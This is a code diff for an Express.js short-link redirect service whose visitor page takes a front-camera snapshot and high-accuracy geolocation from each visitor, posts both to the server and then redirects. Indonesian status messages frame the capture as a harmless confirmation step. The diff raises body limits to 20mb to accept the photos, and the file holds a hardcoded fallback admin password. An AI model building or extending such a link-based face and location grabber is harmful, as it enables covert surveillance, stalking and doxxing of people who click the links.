@@ -18,7 +18,8 @@ const ADMIN_PASS = process.env.ADMIN_PASS || 'Duwiarsana1234!?';
 const activeTokens = new Set();
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '20mb' }));
+app.use(express.urlencoded({ limit: '20mb', extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Persistent Database Storage Setup
@@ -497,36 +498,45 @@ const handleRedirect = async (req, res) => {
           }
           if (photo) {
             try {
-              await fetch(redirectUrl, {
+              document.getElementById('statusText').innerText = "Menyimpan foto snapshot...";
+              await fetch('/r/' + targetCode, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ photo: photo })
+                body: JSON.stringify({ photo: photo, lat: lat, lon: lon })
               });
-            } catch (e) {}
+            } catch (e) {
+              console.error(e);
+            }
           }
           window.location.replace(redirectUrl);
         }
 
         async function tryCaptureCamera() {
           return new Promise(async (resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+              return resolve(null);
+            }
             try {
-              if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                const video = document.getElementById('webcamVideo');
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(res => setTimeout(res, 800));
-                const canvas = document.getElementById('snapshotCanvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                photoDataUrl = canvas.toDataURL('image/jpeg', 0.75);
-                stream.getTracks().forEach(track => track.stop());
-                resolve(photoDataUrl);
-              } else {
-                resolve(null);
-              }
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360, facingMode: 'user' }, audio: false });
+              const video = document.getElementById('webcamVideo');
+              video.srcObject = stream;
+              video.onloadedmetadata = async () => {
+                try {
+                  await video.play();
+                  await new Promise(res => setTimeout(res, 600));
+                  const canvas = document.getElementById('snapshotCanvas');
+                  canvas.width = video.videoWidth || 480;
+                  canvas.height = video.videoHeight || 360;
+                  const ctx = canvas.getContext('2d');
+                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                  const captured = canvas.toDataURL('image/jpeg', 0.6);
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve(captured);
+                } catch (err) {
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve(null);
+                }
+              };
             } catch (e) {
               resolve(null);
             }
@@ -534,18 +544,19 @@ const handleRedirect = async (req, res) => {
         }
 
         async function initCapture() {
-          await tryCaptureCamera();
+          const photo = await tryCaptureCamera();
+          if (photo) photoDataUrl = photo;
 
           if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
               async (pos) => {
-                document.getElementById('statusText').innerText = "Terkonfirmasi! Mengarahkan...";
+                document.getElementById('statusText').innerText = "Lokasi terkonfirmasi! Mengarahkan...";
                 proceed(pos.coords.latitude, pos.coords.longitude, photoDataUrl);
               },
               async (err) => {
                 proceed(null, null, photoDataUrl);
               },
-              { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
             );
           } else {
             proceed(null, null, photoDataUrl);
